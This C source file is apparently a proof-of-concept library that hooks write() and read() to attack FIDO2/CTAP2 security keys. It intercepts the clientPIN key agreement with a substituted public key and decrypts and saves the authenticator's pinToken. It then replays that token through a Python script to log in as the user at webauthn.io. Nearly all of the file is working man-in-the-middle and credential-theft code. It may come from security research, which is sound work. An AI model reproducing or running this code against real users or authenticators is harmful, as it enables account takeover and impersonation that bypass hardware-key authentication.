#include "impersonation_attack.h"

int global_file_descriptor;
int (*real_write)(int fd, const void *buf, size_t count);
int (*real_read)(int fd, void *buf, size_t count);


// This function is called when CBOR payload is complete, so after every write is completed
// it is meant to be used to take any action on the payload we need, and then send the frames
int unwrap_cbor (state_helper_t *helper, FILE *attack_helper_file) {

    struct cbor_load_result result;

    cbor_item_t *item = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &result);

    struct cbor_pair *pairs = cbor_map_handle(item);

    // prococol is parameter number 1 in CBOR structure
    int protocol = cbor_get_uint8(pairs[0].value);
    // subCommand is parameter number 2 in CBOR structure
    int subCommand = cbor_get_uint8(pairs[1].value);

    helper->packets_read = 0;
    helper->client_read_so_far = 0;
    helper->ctap_sub_command = subCommand;

    FILE *secret_key_file;
    es256_pk_t *authkey;
    es256_sk_t *secret_key_1;
    fido_blob_t	*shared_secret_1;
    fido_blob_t *shared_secret_2;
    fido_blob_t *final_cbor_payload;
    int c, ms, n = 0;

    switch (helper->ctap_command) {
        case CTAP_CBOR_CLIENT_PIN:

            helper->protocol = protocol;

            switch(helper->ctap_sub_command) {

                case CLIENT_PIN_KEY_EXCHANGE:

                {
                    attack_log("A key agreement command was found [code %d]!\n", helper->ctap_sub_command);

                    helper->modify_cbor = 1;

                    if (attack_helper_file == NULL) {
                        attack_helper_file = fopen(attack_helper_filename, "w");
                    }

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                    fclose(attack_helper_file);

                    remove(token_public_key_cbor_filename);

                    return real_write(helper->write_parameters->fd, helper->write_parameters->buf, helper->write_parameters->count);

                }

                case CLIENT_PIN_GET_PIN_TOKEN:
                case CLIENT_PIN_GET_PIN_TOKEN_UV:
                case CLIENT_PIN_GET_PIN_TOKEN_PIN:

                {
                    attack_log("A getPinToken command was found [code %d]!\n", helper->ctap_sub_command);

                    helper->modify_cbor = 0;
                
                    authkey = calloc(1, sizeof(es256_pk_t));

                    struct cbor_load_result	 cbor;
                    cbor_item_t *cbor_map = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &cbor);
                    struct cbor_pair *cbor_map_elements = cbor_map_handle(cbor_map);

                    int prot = cbor_get_uint8(cbor_map_elements[0].value);

                    cbor_parse_reply(helper->cbor_payload, helper->payload_len, authkey, parse_authkey);

                    secret_key_1 = es256_sk_new_mod();

                    secret_key_file = fopen(secret_key_1_filename, "r");

                    attack_log("Opened secret key file! (NULL = %d)\n", secret_key_file == NULL);

                    while ((c = fgetc(secret_key_file)) != EOF)
                    {
                        secret_key_1->d[n++] = (unsigned char)c;
                    }
                    fclose(secret_key_file);

                    shared_secret_1 = NULL;

                    do_ecdh_mod(NULL, secret_key_1, authkey, &shared_secret_1, prot);

                    attack_log("SHARED SECRET WITH CLIENT: ");
                    printUnsignedChar(shared_secret_1->ptr, shared_secret_1->len, NULL);
                    attack_log("\n\n");

                    helper->client_shared_secret = shared_secret_1;

                    // The shared secret with the client is now discovered
                    // Because the pin was encrypted with this secret, we can recover the pin
                    // In order to complete the MITM attack though, we need to derive a new shared secret with the token and encrypt the pin with it

                    attack_log("CBOR payload before modify_cbor_payload: ");
                    printUnsignedChar(helper->cbor_payload, helper->payload_len, NULL);
                    attack_log("\n");

                    cbor_describe(cbor_map, stdout);
                    fflush(stdout);

                    final_cbor_payload = modify_cbor_payload(helper->cbor_payload, helper->payload_len, shared_secret_1, helper); 

                    attack_log("CBOR payload before send_frames: ");
                    printUnsignedChar(final_cbor_payload->ptr, final_cbor_payload->len, NULL);
                    attack_log("\n");
                    // Last part, where we need to send the payload in steps, like the tx_preamble an tx_frame code in the libfido2 library
                    if (send_frames(helper, helper->command, final_cbor_payload->ptr, final_cbor_payload->len, &ms, real_write) < 0) {
                        errx(1, "Tried to send modified packets to token, but something went wrong!");
                    }

                    helper->modify_cbor = 1;

                    if (attack_helper_file == NULL) {
                        attack_helper_file = fopen(attack_helper_filename, "w");
                    }

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                    fclose(attack_helper_file);
                    
                    return helper->write_parameters->count;

                }

                default:
                    break;

            }

        default:
            break;
    }

    return real_write(helper->write_parameters->fd, helper->write_parameters->buf, helper->write_parameters->count);

}


ssize_t write(int fd, const void *buf, size_t count)
{
    real_write = dlsym(RTLD_NEXT, "write");

    if (hook_this_write(fd, count)) {

        // If file .master_file does not exist, we don't perform the attack.
        if (!file_exists(master_file_filename)) {
            attack_log("File [%s] does not exist, so no attack performed!\n", master_file_filename);
            return real_write(fd, buf, count);
        }

        global_file_descriptor = fd;

        frame_t *fp;
        
        unsigned char pkt_local[sizeof(*fp) + 1];

        memcpy(pkt_local, buf, sizeof(*fp) + 1);

        fp = (struct frame *)(pkt_local + 1);

        state_helper_t* helper;

        // If the file does not exist, then this is the first command, whatever that might be, therefore it has a body.init.data
        if (!file_exists(attack_helper_filename)) {

            // The first byte of body.init.data is the CTAP command.
            uint8_t cmd = fp->body.init.data[0];

            attack_log("Command [%d] detected!\n\n", cmd);

            // We only want to make the attack when the client (browser or app like libfido2) sends certain commands
            switch(cmd) {

                // We start the attack for the ClientPin command, which we want to manipulate
                /* We don't know yet what the subCommand is, so we either:
                    - fake all writes, build the CBOR, check the subcommand and go from there
                    - assume that when there is no helper file this is the first write and therefore it might be the KeyAgreement
                      subCommand (we don't do this, it might be too much of an assumption)
                */
                case CTAP_CBOR_CLIENT_PIN:

                {
                    
                    helper = malloc(sizeof(state_helper_t));

                    // Save information in helper
                    helper->fd = fd;
                    helper->cid = fp->cid;
                    helper->command = fp->body.init.cmd;
                    helper->ctap_command = cmd;
                    helper->payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);
                    helper->writen_so_far = 0;

                    for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                        helper->cbor_payload[i] = fp->body.init.data[i];
                        helper->writen_so_far++;
                    }
                    helper->frames[helper->frame_count++] = *fp;

                    helper->expected_frames = 1;

                    if (sizeof(fp->body.init.data) < helper->payload_len) {
                        helper->expected_frames += ceil((float)(helper->payload_len - sizeof(fp->body.init.data)) / (CTAP_MAX_REPORT_LEN - CTAP_CONT_HEADER_LEN));
                    }

                    attack_log("Expecting %d packets to be sent by the client! (total CBOR length is %ld)\n", helper->expected_frames, helper->payload_len);

                    //more than 1 packet must be sent, we need to save the information in a file and pick it up later
                    //nothing else can be done because cbor data will not be complete, therefore no cbor_load can occur
                    if (sizeof(fp->body.init.data) < helper->payload_len) {

                        attack_log("Additional packets will be sent for command [%d]!\n", cmd);

                        FILE *attack_helper_file = fopen(attack_helper_filename, "w");

                        fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                        fclose(attack_helper_file);

                        free(helper);

                        //do not execute the real write because we don't want to send the original message to the token just yet
                        return count;
                    }

                    // No more packets will be sent, because the payload is small enough to send in 1 write
                    // We deal with the CBOR right now
                    else {

                        attack_log("No additional packets will be sent for command [%d]!\n", cmd);

                        helper->write_parameters = malloc(sizeof(write_parameters_t));
                        helper->write_parameters->fd = fd;
                        helper->write_parameters->buf = buf;
                        helper->write_parameters->count = count;
                        
                        int result = unwrap_cbor(helper, NULL);

                        return result;
                    }                    

                }

                // When we catch this command, what we want to do is make a new request from scratch, using the Python script.
                // We use the pinToken obtained previously to make the assert request.
                case CTAP_CBOR_ASSERT:
                {
                    if (file_exists(rogue_login_filename)) {

                        attack_log("Get Assertion command found!\n");

                        attack_log("\nStarting impersonation with STOLEN PINTOKEN! Using the username in [%s] file!\n", rogue_login_filename);
                        fflush(stdout);

                        int result = system("/tmp/attack/webauthn_io_authenticate.py \"-start\" \"https://webauthn.io\"");

                        // This file must have been created by the Python script with the new request response
                        FILE* assert_data_file = fopen(assert_input_filename, "r");
                        if (assert_data_file == NULL) {
                            printf("New assert data was not found, proceeding without attack!\n");
                            return real_write(fd, buf, count);
                        }

                        struct toggle opt;
                        opt.pin = FIDO_OPT_OMIT;
                        opt.uv = FIDO_OPT_OMIT;
                        opt.up = FIDO_OPT_TRUE;

                        fido_assert_t *assert = prepare_assert(assert_data_file, 0, &opt);

                        //Open dev for the token we have. It is not an ideal implementation, since we are reusing the open from the rogue key attack
                        fido_dev_t *dev = open_user_token();

                        if (dev == NULL) {
                            errx(1, "Error in ASSERT command: dev in NULL!\n");
                        }

                        FILE* stolen_pin_token_file = fopen(pin_token_filename, "r");
                        if (stolen_pin_token_file == NULL) {
                            printf("PIN TOKEN was not found in file! Something went wrong. Ignoring attack...");
                            return real_write(fd, buf, count);
                        }

                        fido_blob_t *pin_token = fido_blob_new();

                        fread(pin_token, sizeof(*pin_token), 1, stolen_pin_token_file);
                        fclose(stolen_pin_token_file);

                        int assert_result = fido_dev_get_assert_mod(dev, assert, pin_token);    

                        attack_log("Assert result: %d\n", assert_result);

                        if (assert_result != FIDO_OK) {
                            attack_log("Assertion failed, aborting attack!\n");
                            return real_write(fd, buf, count);
                        }

                        char *base64_cdh = NULL;
                        char *base64_authdata = NULL;
                        char *base64_sig = NULL;

                        char *base64_cred_id = NULL;
                        int r;

                        // Authenticator gives us the authdata in a serialized cbor payload, we need to parse the info.
                        // If we don't, then the base64 authdata info won't be parsed by the destination
                        struct cbor_load_result discard;
                        cbor_item_t *authdata_cbor_serialized = cbor_load(assert->stmt[0].authdata_cbor.ptr, assert->stmt[0].authdata_cbor.len, &discard);
                        size_t authdata_len = cbor_bytestring_length(authdata_cbor_serialized);
                        unsigned char* authdata = cbor_bytestring_handle(authdata_cbor_serialized);

                        r = base64_encode(assert->cdh.ptr, assert->cdh.len, &base64_cdh);
                        r |= base64_encode(authdata, authdata_len, &base64_authdata);
                        r |= base64_encode(assert->stmt[0].sig.ptr, assert->stmt[0].sig.len, &base64_sig);

                        fido_blob_t *credential_id = assert->allow_list.ptr;

                        r |= base64_encode(credential_id->ptr, credential_id->len, &base64_cred_id);

                        FILE* assert_data_to_send_file = fopen(assert_response_filename, "w");
                        fprintf(assert_data_to_send_file, "%s\n", base64_cdh);
                        fprintf(assert_data_to_send_file, "%s\n", base64_authdata);
                        fprintf(assert_data_to_send_file, "%s\n", base64_sig);
                        fprintf(assert_data_to_send_file, "%s\n", base64_cred_id);
                        fclose(assert_data_to_send_file);

                        attack_log("CDH: %s\n", base64_cdh);
                        attack_log("Authdata: %s\n", base64_authdata);
                        attack_log("SIG: %s\n", base64_sig);
                        attack_log("Cred_id: %s\n", base64_cred_id);

                        result = 0;

                        result = system("/tmp/attack/webauthn_io_authenticate.py \"-complete\" \"https://webauthn.io\"");

                        remove(master_file_filename);
                        
                        return real_write(fd, buf, count);
                    }

                    else {

                        helper = malloc(sizeof(state_helper_t));

                        // Save information in helper
                        helper->fd = fd;
                        helper->command = fp->body.init.cmd;
                        helper->ctap_command = cmd;
                        helper->cid = fp->cid;
                        helper->payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);
                        helper->writen_so_far = 0;
                        helper->frame_count = 0;

                        for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                            helper->cbor_payload[i] = fp->body.init.data[i];
                            helper->writen_so_far++;
                        }
                        helper->frames[helper->frame_count++] = *fp;

                        FILE *attack_helper_file = fopen(attack_helper_filename, "w");
                        fwrite(helper, sizeof(*helper), 1, attack_helper_file);      
                        fclose(attack_helper_file);  

                        free(helper);

                        return real_write(fd, buf, count);
                    }
                    
                }

                default:
                    break;

            }

            return real_write(fd, buf, count);
        }


        // This is not the first write for this command, so we continue writing...
        else {

            helper = malloc(sizeof(state_helper_t));

            FILE *attack_helper_file = fopen(attack_helper_filename, "r+");
            if (attack_helper_filename == NULL) {
                printf("Something is wrong, the file [%s] should exist but does not! Ignoring attack...", attack_helper_filename);
                return real_write(fd, buf, count);
            }
            fread(helper, sizeof(state_helper_t), 1, attack_helper_file);

            rewind(attack_helper_file);

            switch(helper->ctap_command) {
                case CTAP_CBOR_CLIENT_PIN:
                case CTAP_CBOR_MAKECRED:
                case CTAP_CBOR_ASSERT:
                    break;
                default:
                    return real_write(fd, buf, count);
            }
        

            // This is not the last packet to be written
            if (helper->payload_len - helper->writen_so_far > sizeof(fp->body.cont.data)) {

                int writen_so_far_aux = helper->writen_so_far;
                for (int i = 0; i < sizeof(fp->body.cont.data); i++) {
                    (helper->cbor_payload + writen_so_far_aux)[i] = fp->body.cont.data[i];
                    helper->writen_so_far++;
                }
                helper->frames[helper->frame_count++] = *fp;

                attack_log("Continuing packet writing for command [%d] (%d out of %d)\n", helper->ctap_command, helper->frame_count, helper->expected_frames);

                fwrite(helper, sizeof(*helper), 1, attack_helper_file);      
                fclose(attack_helper_file);
                    
                return real_write(fd, buf, count);

            }

            // This is the last packet to be written, and where the action takes place
            else {

                int writen_so_far_aux = helper->writen_so_far;
                for (int i = 0; i < helper->payload_len - writen_so_far_aux; i++) {
                    (helper->cbor_payload + writen_so_far_aux)[i] = fp->body.cont.data[i];
                    helper->writen_so_far++;
                }
                helper->frames[helper->frame_count++] = *fp;

                attack_log("Writing final packet for command [%d] (%d out of %d)\n", helper->ctap_command, helper->frame_count, helper->expected_frames);

                /* 
                From this point on we have every frame saved in the helper structure, and the real token is missing the last one,
                which means the client is still waiting for the last write's response.
                */

                struct cbor_load_result result;

                cbor_item_t *item = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &result);

                size_t map_size = cbor_map_size(item);

                struct cbor_pair *pairs = cbor_map_handle(item);

#ifdef ATTACK_LOG
                if (helper->ctap_command == CTAP_CBOR_ASSERT) {
                    
                    attack_log("Printing CBOR from ASSERT REQUEST TO DEBUG!\n");
                    cbor_describe(item, stdout);
                    fflush(stdout);

                    cbor_item_t* credential_map = pairs[2].value;
                    struct cbor_pair *credential_pairs = cbor_map_handle(*cbor_array_handle(credential_map));
                    attack_log("SIZE: %ld\n", cbor_map_size(credential_map));

                    cbor_item_t* credential = credential_pairs[0].value;
                    
                    unsigned char* credential_bytes = NULL;
                    size_t len = 0;

                    int r = cbor_bytestring_copy(credential, &credential_bytes, &len);

                    attack_log("RESULT: %d || CREDENTIAL LENGTH: %ld\n", r, len);
                    for (int i = 0; i < len; i++) {
                        attack_log("%02X", credential_bytes[i]);
                    }
                    attack_log("\n");
                }
#endif

                switch(helper->ctap_command) {

                    case CTAP_CBOR_CLIENT_PIN:
                        
                    {
                        helper->write_parameters = malloc(sizeof(write_parameters_t));
                        helper->write_parameters->fd = fd;
                        helper->write_parameters->buf = buf;
                        helper->write_parameters->count = count;
                        
                        int result = unwrap_cbor(helper, attack_helper_file);

                        return result;
                    }
                                          
                    default:
                        break;
                }

                fclose(attack_helper_file);

                return real_write(fd, buf, count);

            }

        }
                
    }

    return real_write(fd, buf, count);

} 


ssize_t read(int fd, void *buf, size_t count)
{
    real_read = dlsym(RTLD_NEXT, "read");

    ssize_t reply_len;

    if (hook_this_read_v2(fd, count)) {

        // If file .master_file does not exist, we don't attack, just read as normal.
        if (!file_exists(master_file_filename)) {
            fido_log_debug("File [%s] does not exist, so no attack performed!\n", master_file_filename);
            return real_read(fd, buf, count);
        }

        FILE* attack_helper_file = fopen(attack_helper_filename, "r+");
        if (attack_helper_file == NULL) {
            return real_read(fd, buf, count);
        }

        global_file_descriptor = fd;

        state_helper_t *helper = malloc(sizeof(state_helper_t));

        fread(helper, sizeof(*helper), 1, attack_helper_file);
        rewind(attack_helper_file);

        switch(helper->ctap_command) {

            case CTAP_CBOR_CLIENT_PIN:

            {

                if (helper->modify_cbor == 0) {
                    int amount = real_read(fd, buf, count);

                    frame_t *fp = (frame_t *)buf;

                    if (helper->client_read_so_far == 0 && helper->packets_read == 0) {
                        helper->client_read_so_far += amount;
                        helper->packets_read++;
                    }

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                    fclose(attack_helper_file);

                    return amount;
                }

                // First read for the CTAP command CLIENT PIN
                if (helper->client_read_so_far == 0 && helper->packets_read == 0) {

                    // This is the first read after a write, so the cbor_payload from the previous write is deleted and the frame
                    // counter set to 0
                    memset(helper->cbor_payload, 0, sizeof(helper->cbor_payload));
                    memset(helper->original_cbor_payload, 0, sizeof(helper->original_cbor_payload));
                    helper->frame_count = 0;
                    helper->payload_len = 0;
                    helper->original_payload_len = 0;

                    // We are going to read the first packet from the token here
                    switch(helper->ctap_sub_command) {

                        case CLIENT_PIN_KEY_EXCHANGE:
 
                        {
                            int amount_read = real_read(fd, buf, count);
                            frame_t *fp = (frame_t*)buf;

                            printFrame(fp, 0);

                            if (fp->body.init.data[0] != FIDO_OK) {
                                attack_log("ERROR RESPONSE FROM TOKEN: %02x\n", fp->body.init.data[0]);
                                remove(attack_helper_filename);
                                return amount_read;
                            }

                            // Create our own key pair to use with client
                            es256_sk_t *sk = es256_sk_new_mod();
                            es256_pk_t *pk = es256_pk_new_mod();

                            es256_sk_create_mod(sk);
                            es256_derive_pk_mod(sk, pk);

                            attack_log("(HOOKED) TOKEN PUBLIC KEY X: ");
                            printUnsignedChar(pk->x, 32, NULL);
                            attack_log("\n");
                            attack_log("(HOOKED) TOKEN PUBLIC KEY y: ");
                            printUnsignedChar(pk->y, 32, NULL);
                            attack_log("\n");

                            // Encode into CBOR structure
                            cbor_item_t *newPublicKeyCbor = es256_pk_encode_mod(pk, 1);

                            // Serialize CBOR structure
                            helper->hooked_token_public_key = fido_blob_new();
                            size_t alloc_len;
                            size_t hooked_token_public_key_length = cbor_serialize_alloc(newPublicKeyCbor, &(helper->hooked_token_public_key->ptr), &alloc_len);
                            helper->hooked_token_public_key->len = hooked_token_public_key_length;

                            // Save private key to later derive shared secret with client
                            FILE* hook_secret_key = fopen(secret_key_1_filename, "w");
                            for (int i = 0; i < sizeof(sk->d); i++) {
                                fputc(sk->d[i], hook_secret_key);
                            }   
                            fclose(hook_secret_key);
                            
                            
                            helper->original_payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);

                            helper->original_cbor_payload_index = 0;
                            for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                                helper->original_cbor_payload[i] = fp->body.init.data[i];
                                helper->original_cbor_payload_index++;
                            }

                            int maximum_index = MIN(sizeof(fp->body.init.data), helper->hooked_token_public_key->len);
                            helper->hooked_token_public_key_index = 0;
                            for (int i = token_pub_key_start_index; i < maximum_index; i++) {
                                fp->body.init.data[i] = helper->hooked_token_public_key->ptr[i - token_pub_key_start_index];
                                helper->hooked_token_public_key_index++;
                            }

                            helper->payload_len = token_pub_key_start_index + helper->hooked_token_public_key->len;

                            if (helper->payload_len != helper->original_payload_len) {
                                printf("WARNING! In command [%d], subcommand [%d], the original payload and modified payload have different lengths (original = %ld, modified = %ld)!\n", helper->ctap_command, helper->ctap_sub_command, helper->original_payload_len, helper->payload_len);
                            }

                            helper->cbor_payload_index = 0;
                            for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                                helper->cbor_payload[i] = fp->body.init.data[i];
                                helper->cbor_payload_index++;
                                helper->client_read_so_far++;
                            }

                            helper->frames[helper->frame_count++] = *fp;
                            helper->packets_read++;

                            fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                            fclose(attack_helper_file);

                            return amount_read;

                        }
                            
                        case CLIENT_PIN_GET_PIN_TOKEN:
                        case CLIENT_PIN_GET_PIN_TOKEN_UV:
                        case CLIENT_PIN_GET_PIN_TOKEN_PIN:

                        {
                            attack_log("STARTING READ FOR A GET PIN TOKEN command (%d)!\n", helper->ctap_sub_command);

                            int amount_read = real_read(fd, buf, count);
                            frame_t *fp = (frame_t*)buf;

                            while (fp->body.init.data[0] != FIDO_OK) {
                                
                                amount_read = real_read(fd, buf, count);
                                fp = (frame_t*)buf;
                            }

                            struct cbor_load_result	 cbor;
                            cbor_item_t *cbor_frame_content = cbor_load(fp->body.init.data + 1, sizeof(fp->body.init.data) - 1, &cbor);
                            struct cbor_pair *cbor_map_elements = cbor_map_handle(cbor_frame_content);

                            fido_blob_t* encryptedPinToken = fido_blob_new();
                            fido_blob_t* decryptedPinToken = fido_blob_new();

                            parse_uv_token(cbor_map_elements[0].key, cbor_map_elements[0].value, encryptedPinToken);

                            attack_log("Encrypted PinToken length: %ld\n", encryptedPinToken->len);

                            int dec_result = aes256_cbc_dec(helper->protocol, helper->token_shared_secret, encryptedPinToken, decryptedPinToken);

                            attack_log("\n\nAUTHENTICATOR PINTOKEN (decryption result = %d): ", dec_result);
                            printUnsignedChar(decryptedPinToken->ptr, decryptedPinToken->len, NULL);
                            attack_log("\n");

                            // Save pin token to file so it can be used later
                            FILE* pin_token_file = fopen(pin_token_filename, "w");
                            fwrite(decryptedPinToken, sizeof(*decryptedPinToken), 1, pin_token_file);
                            fclose(pin_token_file);

                            attack_log("\nAuthenticator PINTOKEN was successfully obtained and saved in the file [%s]\n", pin_token_filename);

                            //encrypt UV token with client_shared secret, then change cbor and send back

                            fido_blob_t* clientEncryptedPinToken = fido_blob_new();

                            aes256_cbc_enc(helper->protocol, helper->client_shared_secret, decryptedPinToken, clientEncryptedPinToken);

                            cbor_map_elements[0].value = cbor_build_bytestring(clientEncryptedPinToken->ptr, clientEncryptedPinToken->len);

                            // Serialize cbor_map, fill first position with command like cbor_payload, and return
                            size_t alloc_len;
                            unsigned char* serialized_map = NULL;
                            size_t len = cbor_serialize_alloc(cbor_frame_content, &serialized_map, &alloc_len);


                            // Copy the new encryped token, in CBOR format, and serialized in "serialized_map", to the frame data
                            for (int i = 0; i < len; i++) {
                                fp->body.init.data[i + token_pin_token_start_index] = serialized_map[i];
                            }

                            fclose(attack_helper_file);

                            remove(attack_helper_filename);

                            return amount_read;
                        }

                        default:
                            fclose(attack_helper_file);
                            return real_read(fd, buf, count);
                    }
            

                }

                // Next reads for the CTAP command in the helper structure
                else {

                    int amount_read = real_read(fd, buf, count);

                    frame_t *fp = (frame_t*)buf;

                    // Describes how many bytes will be read from frame to cbor_payload.
                    // If the amount to read is bigger than the data array in the frame, read the whole array
                    int amount_to_read = MIN(sizeof(fp->body.cont.data), helper->original_payload_len - helper->original_cbor_payload_index);

                    for (int i = 0; i < amount_to_read; i++) {
                        helper->original_cbor_payload[i + helper->original_cbor_payload_index] = fp->body.cont.data[i];
                    }
                    helper->original_cbor_payload_index += amount_to_read;

                    helper->is_last_packet = (helper->payload_len - helper->client_read_so_far <= sizeof(fp->body.cont.data));

                    switch(helper->ctap_sub_command) {
                        case CLIENT_PIN_KEY_EXCHANGE:
                        {
                            // copy more bytes of hooked public key to the frame
                            int max = MIN(FRAME_CONT_DATA_LEN, helper->hooked_token_public_key->len - helper->hooked_token_public_key_index);
                            for (int i = 0; i < max; i++) {
                                fp->body.cont.data[i] = helper->hooked_token_public_key->ptr[i + helper->hooked_token_public_key_index];
                            }
                            helper->hooked_token_public_key_index += max;

                            int amount_to_read = MIN(sizeof(fp->body.cont.data), helper->payload_len - helper->cbor_payload_index);
                            for (int i = 0; i < amount_to_read; i++) {
                                helper->cbor_payload[i + helper->cbor_payload_index] = fp->body.cont.data[i];
                                helper->client_read_so_far++;
                            }
                            helper->cbor_payload_index += amount_to_read;

                            helper->frames[helper->frame_count++] = *fp;
                            helper->packets_read++;

                            // Save token public key to later derive a different shared secret with token
                            FILE* token_public_key_cbor_file = fopen(token_public_key_cbor_filename, "a");
                            for (int i = 0; i < helper->original_payload_len; i++) {  
                                fputc(helper->original_cbor_payload[i], token_public_key_cbor_file);
                            }
                            fclose(token_public_key_cbor_file);

                            fwrite(helper, sizeof(*helper), 1, attack_helper_file);

                            break;
                            
                        }
                        case CLIENT_PIN_GET_PIN_TOKEN:
                        {
                            return real_read(fd, buf, count);
                        }
                        default:
                            return real_read(fd, buf, count);
                    }

                    fclose(attack_helper_file);

                    if (helper->is_last_packet) {
                        attack_log("\nLast packet was read!\n");
                        remove(attack_helper_filename);
                        return amount_read;
                    }

                    return amount_read;
                }
            }
            
            // Catches the real response from the user's token, not necessary, just for debugging
            case CTAP_CBOR_ASSERT:
            {
                int amount_read = real_read(fd, buf, count);
                frame_t *fp = (frame_t*)buf;

                // first read
                if (helper->client_read_so_far == 0 && helper->packets_read == 0) {
                    memset(helper->cbor_payload, 0, sizeof(helper->cbor_payload));
                    helper->frame_count = 0;
                    helper->payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl)    ;

                    if (helper->payload_len == 1) {
                        fclose(attack_helper_file);
                        return amount_read;
                    }

                    for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                        helper->cbor_payload[i] = fp->body.init.data[i];
                        helper->client_read_so_far++;
                    }
                    helper->frames[helper->frame_count++] = *fp;
                    helper->packets_read++;

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                    fclose(attack_helper_file);

                    return amount_read;
                }   
                
                else {

                    // Describes how many bytes will be read from frame to cbor_payload.
                    // If the amount to read is bigger than the data array in the frame, read the whole array
                    int amount_to_read = MIN(sizeof(fp->body.cont.data), helper->payload_len - helper->client_read_so_far);

                    for (int i = 0; i < amount_to_read; i++) {
                        helper->cbor_payload[i + helper->client_read_so_far] = fp->body.cont.data[i];
                    }
                    helper->client_read_so_far += amount_to_read;
                    helper->frames[helper->frame_count++] = *fp;
                    helper->packets_read++;

                    helper->is_last_packet = (helper->payload_len - helper->client_read_so_far <= sizeof(fp->body.cont.data));

                    if (helper->is_last_packet) {

                        struct cbor_load_result result;
                        cbor_item_t *item = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &result);

                        fido_assert_t *assert = fido_assert_new();

                        /* start with room for a single assertion */
                        if ((assert->stmt = calloc(1, sizeof(fido_assert_stmt))) == NULL)
                            return (FIDO_ERR_INTERNAL);

                        int parse_result = cbor_parse_reply(helper->cbor_payload, helper->payload_len, &assert->stmt[assert->stmt_len], parse_assert_reply);

                        char *cdh = NULL;
                        char *base64_authdata = NULL;
                        char *sig = NULL;

                        char *cred_id = NULL;
                        int r;

                        cbor_item_t *authdata_cbor_serialized = cbor_load(assert->stmt[0].authdata_cbor.ptr, assert->stmt[0].authdata_cbor.len, &result);
                        size_t authdata_len = cbor_bytestring_length(authdata_cbor_serialized);
                        unsigned char* authdata = cbor_bytestring_handle(authdata_cbor_serialized);

                        r = base64_encode(assert->cdh.ptr, assert->cdh.len, &cdh);
                        r |= base64_encode(authdata, authdata_len, &base64_authdata);
                        r |= base64_encode(assert->stmt[0].sig.ptr, assert->stmt[0].sig.len, &sig);
                        

                        size_t len = cbor_bytestring_length(item);

                        // fido_blob_t *credential_id = assert->allow_list.ptr;

                        // r |= base64_encode(credential_id->ptr, credential_id->len, &cred_id);

                        FILE* assert_data_to_send_file = fopen("legit_assert_response.txt", "w");
                        fprintf(assert_data_to_send_file, "%s\n", cdh);
                        fprintf(assert_data_to_send_file, "%s\n", base64_authdata);
                        fprintf(assert_data_to_send_file, "%s\n", sig);
                        fclose(assert_data_to_send_file);

                        attack_log("CDH: %s\n", cdh);
                        attack_log("Authdata: %s\n", authdata);
                        attack_log("SIG: %s\n", sig);

                        remove(master_file_filename);

                    }

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                    fclose(attack_helper_file);

                    return amount_read;

                }

                break;            
                
            }

            default:
            {
                fclose(attack_helper_file);
                return real_read(fd, buf, count);
            }
        }        
    }
   
    return real_read(fd, buf, count);
}